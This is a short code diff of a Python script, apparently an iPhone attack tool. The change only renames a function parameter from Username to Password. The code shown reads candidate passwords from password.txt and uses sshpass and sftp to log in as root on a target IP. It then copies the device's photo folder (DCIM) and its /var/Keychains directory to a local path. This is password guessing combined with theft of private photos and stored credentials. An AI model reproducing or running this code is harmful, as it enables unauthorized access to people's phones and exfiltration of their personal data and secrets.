@@ -71,10 +71,10 @@ parser = optparse.OptionParser()
 parser.add_option("-p", "--path",dest="path", help="path you save file in ")
 parser.add_option("-t", "--target",dest="target", help="put target ip")
 (options, arguments) = parser.parse_args()
-def getpassword(Username):
+def getpassword(Password):
         str(subprocess.run(
-        ["sshpass", "-p", Username,"sftp" ,"-r" ,f"root@{options.target}:/var/mobile/Media/DCIM/100APPLE/ %s" %options.path]))
-        str(subprocess.run(["sshpass", "-p", Username, "sftp", "-r",
+        ["sshpass", "-p", Password,"sftp" ,"-r" ,f"root@{options.target}:/var/mobile/Media/DCIM/100APPLE/ %s" %options.path]))
+        str(subprocess.run(["sshpass", "-p", Password, "sftp", "-r",
                             f"root@{options.target}:/var/Keychains %s" % options.path]))
 file = open("password.txt","r")
 lines = file.readlines()
